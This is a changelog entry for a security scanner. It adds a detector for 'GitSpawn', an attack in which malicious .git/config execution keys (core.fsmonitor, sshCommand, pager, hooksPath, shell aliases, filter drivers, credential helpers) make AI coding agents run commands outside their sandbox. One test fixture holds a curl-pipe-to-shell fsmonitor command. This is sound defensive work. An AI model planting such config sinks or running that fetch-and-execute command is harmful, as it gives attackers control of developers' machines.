# Changelog 2026-10

## 2026-10-05
- **Vector researched:** *GitSpawn* — malicious git-config execution sinks (Manifold
  Security, disclosed Sept 2026; 8 flaws across 7 CLI coding agents incl. Claude Code,
  Codex, Cursor, Goose, Grok Build, Qwen Code, Hermes). A repository's `.git/config` can
  set keys git runs as an external program — `core.fsmonitor` (auto-fires on the next
  index refresh with **no** approval prompt), `core.sshCommand`, `core.pager`,
  `core.hooksPath`, a `!`-shell alias, a filter/diff driver, a non-builtin
  `credential.helper` — yielding command execution outside the agent's sandbox with the
  developer's full privileges. The 2022 `safe.directory` fix does not stop it. Sources:
  Cloud Security Alliance research note "GitSpawn: Malicious Git Configs Hijack AI Coding
  Agents" (labs.cloudsecurityalliance.org, 2026-09-04); Adversa.ai "AI coding agent
  vulnerabilities, October 2026: GitSpawn and more"
  (https://adversa.ai/blog/top-ai-coding-agent-security-resources-october-2026).
- **Gap:** distinct surface from every existing served-content detector. `_hidden_ai_injection`
  / `_chat_template_injection` inspect HTML, `_mcp_tool_poisoning` needs a JSON `tools/list`,
  `_agent_file_poisoning` fetches well-known agent-instruction markdown. A served/exposed
  `.git/config` (INI) carrying an execution sink was caught by none — grep confirmed no
  `git/config` / `fsmonitor` / `sshCommand` / `hooksPath` handling anywhere in the package.
  Real, valuable (exposed `.git/` is a common real-world misconfiguration, and a config with
  an exec sink is both an info leak and a GitSpawn RCE primitive), deterministic, and low-FP.
- **Added:** `bezpiecznik/adapters/web/modern_scanner.py` — `_git_config_rce()` plus
  module-level helpers `_git_config_sink()` / `_git_unquote()` and the sink tables
  `_GIT_EXEC_KEYS`, `_GIT_EXEC_SUBKEYS`, `_GIT_SAFE_CRED` (+ `_GIT_SECTION` / `_GIT_ENTRY`
  INI regexes). Fetches `/.git/config`, confirms it is a git config (not an HTML/SPA
  catch-all), parses the INI tracking section/subsection, and fires only when a sink key
  holds an actual command — never on a benign boolean (`fsmonitor = true`), a built-in
  `credential.helper` (osxkeychain/cache/store/…), or a non-`!` alias. New
  `git_config_paths` param on `ModernScanner.scan()` (default `/.git/config`), wired into
  `agent/orchestrator.py` alongside the other modern classes (no new agent tool needed).
  Maps to **A08:2025 Software or Data Integrity Failures / CWE-94**, HIGH.
- **Tested:** `python3 -m compileall bezpiecznik` clean. Self-contained suite (unit +
  end-to-end with the **real** `ModernScanner` over a throwaway localhost server serving
  `/.git/config`). Unit `_git_config_sink`: 8/8 positives fire (`core.fsmonitor` command,
  `core.sshCommand`, `core.pager`, `core.hooksPath`, a `!`-shell alias, a `[filter "lfs"]
  clean` driver, a `!`-`credential.helper`, a quoted Windows-path fsmonitor); 5/5 benign
  inputs stay silent (clean config, `fsmonitor = true`, `helper = osxkeychain`, a normal
  `co=checkout` alias, a commented-out sink). End-to-end: a `/vuln/.git/config` with
  `core.fsmonitor = sh -c "curl …|sh"` **fires once** (HIGH), a clean `/safe/.git/config`
  stays **silent**, and a 404 / non-git file produces no finding and no crash.
- **Docs:** GUIDE.md — new Web/API coverage-matrix row ("Malicious git-config execution
  sink (GitSpawn)").
